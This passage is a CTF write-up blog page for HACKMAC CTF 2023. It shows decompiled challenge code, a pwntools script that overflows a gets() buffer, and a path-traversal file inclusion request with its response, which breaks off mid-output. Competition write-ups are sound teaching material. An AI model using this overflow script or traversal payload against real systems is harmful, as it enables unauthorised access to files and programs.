@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HACKMAC CTF 2023 (Top #1 Postgrad) | heckintosh</title>
+<meta property="og:title" content="HACKMAC CTF 2023 (Top #1 Postgrad) | heckintosh" />
+<meta name="twitter:title" content="HACKMAC CTF 2023 (Top #1 Postgrad) | heckintosh" />
+<meta itemprop="name" content="HACKMAC CTF 2023 (Top #1 Postgrad) | heckintosh" />
+<meta name="application-name" content="HACKMAC CTF 2023 (Top #1 Postgrad) | heckintosh" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="Rank 8 overall, will try harder next year">
+<meta itemprop="description" content="Rank 8 overall, will try harder next year" />
+<meta property="og:description" content="Rank 8 overall, will try harder next year" />
+<meta name="twitter:description" content="Rank 8 overall, will try harder next year" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/competitions/hackmac2023/" title="" />
+
+
+
+  <meta itemprop="image" content="http://localhost:1313/" />
+  <meta property="og:image" content="http://localhost:1313/" />
+  <meta name="twitter:image" content="http://localhost:1313/" />
+  <meta name="twitter:image:src" content="http://localhost:1313/" />
+
+
+
+
+
+<meta name="generator" content="Hugo 0.126.3">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/competitions/hackmac2023/">
+    <link href="/style.min.0fb720d6ac632d49e6b1a4aa6722b3e33176e0b6a3f58ab17a5b3f7248397785.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+<script>
+    var _paq = window._paq = window._paq || [];
+     
+    _paq.push(['trackPageView']);
+    _paq.push(['enableLinkTracking']);
+    (function() {
+      var u="//f2e9-49-193-188-255.ngrok-free.app/";
+      _paq.push(['setTrackerUrl', u+'matomo.php']);
+      _paq.push(['setSiteId', '1']);
+      var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+      g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+    })();
+  </script>
+  
+  
+  
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/competitions/">
+                        Competitions
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        Portfolio
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HACKMAC CTF 2023 (Top #1 Postgrad)</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-23T00:00:00&#43;00:00" itemprop="datePublished"> 23 Oct 2023 </time>
+                </div>
+                
+            </header>
+            <details class="toc">
+                <summary><b>Table of Contents</b></summary>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#binary-exploitation-reverse-engineering">Binary Exploitation/ Reverse Engineering</a>
+      <ul>
+        <li><a href="#1-game-of-exploits">1. Game Of Exploits</a></li>
+        <li><a href="#2-secret-vault">2. Secret Vault</a></li>
+      </ul>
+    </li>
+    <li><a href="#citadel---lookingforinformation">Citadel - LookingForInformation</a>
+      <ul>
+        <li><a href="#1-just-getting-started">1. Just getting started</a></li>
+        <li><a href="#2-avoidance">2. Avoidance</a></li>
+        <li><a href="#3-translation-required">3. Translation Required</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics">Forensics</a>
+      <ul>
+        <li><a href="#1-lost-in-installation">1. Lost in Installation</a></li>
+        <li><a href="#2-lost-in-mail">2. Lost in Mail</a></li>
+        <li><a href="#3-loss-in-redaction">3. Loss in redaction</a></li>
+        <li><a href="#4-lost-in-space">4. Lost in space</a></li>
+      </ul>
+    </li>
+    <li><a href="#secdim">SECDIM</a>
+      <ul>
+        <li><a href="#1-boeing787-pyctf">1. Boeing787-py.ctf</a></li>
+        <li><a href="#2-sayhello-pyctf">2. Sayhello-py.ctf</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+            </details><div class="page-content">
+                <h2 id="binary-exploitation-reverse-engineering">Binary Exploitation/ Reverse Engineering</h2>
+<h3 id="1-game-of-exploits">1. Game Of Exploits</h3>
+<p>Strings the binary and grep for the flag pattern.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ strings GOE <span class="p">|</span> grep HACKMAC
+</span></span></code></pre></div><p><code>HackMac{https://www.youtube.com/watch?v=dQw4w9WgXcQ}</code></p>
+<h3 id="2-secret-vault">2. Secret Vault</h3>
+<p>Put the binary into Ghidra for decompiling to readable code. There are three phases that we need to pass.</p>
+<p>Phase 1:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">phase1</span><span class="p">(</span><span class="n">undefined</span> <span class="n">param1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">7</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nf">read_six_numbers</span><span class="p">(</span><span class="n">param_1</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">explode_bomb</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">local_c</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span><span class="p">[</span><span class="n">local_c</span><span class="p">]</span> <span class="o">!=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="n">local_c</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">explode_bomb</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Phase 2 passed!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>We only need to enter the 6 integerers, separated with spaces to pass the conditions in the for loop. That would be 0 3 6 10 15.</p>
+<p>Phase 2:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">phase_2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="n">param_2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">sVar4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">sVar4</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">sVar4</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">explode_bomb</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">param_1</span> <span class="o">=</span> <span class="o">*</span><span class="n">param_1</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="n">param_1</span> <span class="o">^</span> <span class="mh">0xe3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sVar4</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">cVar1</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[</span><span class="n">sVar4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">cVar2</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sVar4</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">cVar1</span> <span class="o">%</span> <span class="sc">&#39;\n&#39;</span> <span class="o">+</span> <span class="n">cVar2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">sVar4</span> <span class="o">*</span> <span class="sc">&#39;\x05&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">param_1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;@&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">param_1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_2</span> <span class="o">+</span> <span class="mi">3</span><span class="p">))</span> <span class="o">+</span> <span class="sc">&#39;C&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">param_1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="sc">&#39;\x01&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">iVar3</span> <span class="o">=</span> <span class="nf">strings_not_equal</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">&#34;9Ns@Ph&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar3</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">explode_bomb</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>We have to enter a corrected password of length six so that after going through all the binary operations we end up with &ldquo;9Ns@Ph&rdquo;. It is just a matter of doing basic maths. Except for the fifth characters of the password when it involves param2 which we do not know the value of on the remote binary. I opt to bruteforce the fifth characters. The string that passes phase 2 is <code>rtR@ng</code>.</p>
+<p>Phase 3:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">phase_3</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_208</span> <span class="p">[</span><span class="mi">508</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;You</span><span class="se">\&#39;</span><span class="s">ve been flowing through these phases but you</span><span class="se">\&#39;</span><span class="s">ll never access my unreachable Password: &#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">local_208</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sVar2</span> <span class="o">=</span> <span class="nf">strcspn</span><span class="p">(</span><span class="n">local_208</span><span class="p">,</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_208</span><span class="p">[</span><span class="n">sVar2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">local_208</span><span class="p">,</span><span class="s">&#34;Not_real_pass&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> Correct Password &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> Wrong Password &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> FLAG{not_the_flag}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Overflow local_208 array so that we can change the value of local_c to be different from 0. The flag will be printed out then.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># solve.py</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./Vault&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">is_local</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">is_remote</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntilS</span><span class="p">(</span><span class="s2">&#34;dare!:&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;0 1 3 6 10 15&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntilS</span><span class="p">(</span><span class="s2">&#34;password!! 2:&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;rtR@ng&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;unreachable pass:&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;0&#34;</span> <span class="o">*</span> <span class="mi">600</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">))</span>
+</span></span></code></pre></div><h2 id="citadel---lookingforinformation">Citadel - LookingForInformation</h2>
+<h3 id="1-just-getting-started">1. Just getting started</h3>
+<p>The hint was the flag is in the directory below the current server files. There is a local file inclusion vulnerability in the <code>view</code> parameter.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/index.php?view=../flag.txt</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.227.231</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=gb09qc0o420fbfmi9lhns77970</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="err">...</span>
+</span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">&lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">    &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">	&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;style.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">    &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">    &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">	&lt;div class=&#34;menu&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">	    &lt;a href=&#34;index.php&#34;&gt;Main Page&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">	    &lt;a href=&#34;index.php?view=about-us.html&#34;&gt;About Us&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">	    &lt;a href=&#34;index.php?view=contact-us.html&#34;&gt;Contact&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">	&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">Flag1 - HACKMAC{N3ver_tru5t_G3T_param3ters!}
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">I&#39;ve stored our sensitive testing data below and it seems like it&#39;s working. To the rest of the IT team, I&#39;ve pushed some updates to /etc/hosts.
+</span></span></span><span class="line"><span class="cl"><span class="g">Please check this file to make sure nothing is broken!
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">#This information means nothing
